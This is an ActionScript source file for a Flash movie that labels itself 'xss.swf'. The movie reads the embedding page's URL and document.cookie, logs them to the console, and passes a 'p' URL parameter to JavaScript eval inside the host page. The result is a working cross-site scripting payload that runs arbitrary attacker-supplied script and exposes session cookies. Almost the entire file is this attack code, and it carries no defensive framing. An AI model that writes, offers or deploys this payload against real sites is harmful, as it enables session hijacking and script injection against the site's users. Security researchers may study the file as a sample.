lg('Loading');

package
{
	import flash.display.MovieClip

	public class Main extends MovieClip
	{
		function Main()
		{
			var location = flash.external.ExternalInterface.call('window.location.href.toString');
			var cookies = flash.external.ExternalInterface.call('document.cookie');

			lg('location = ' + location);
			lg('cookies = ' + cookies);

			lg('init...');
			try {
				var params:Object = flash.display.LoaderInfo(root.loaderInfo).parameters;
				for (var k in params) {
				  lg ('params['+ k +'] = '+ params[k]);
				}

				if (params.p) {
					var payload:String = params.p as String;
					lg('payload detected. executing...');
					flash.external.ExternalInterface.call('eval', 'try { eval('+payload+')} catch(e) {console.warn("[xss.swf] eval err", e)}');
				}
			} catch (e:Error) {
				lg('Errors happened. you can now has crying');

			  lg(e);
			}

			lg('Done');
		}
	}
}

function lg (what){
	flash.external.ExternalInterface.call("console.log", '[xss.swf@{XSSSWFID}] ' + what);
}
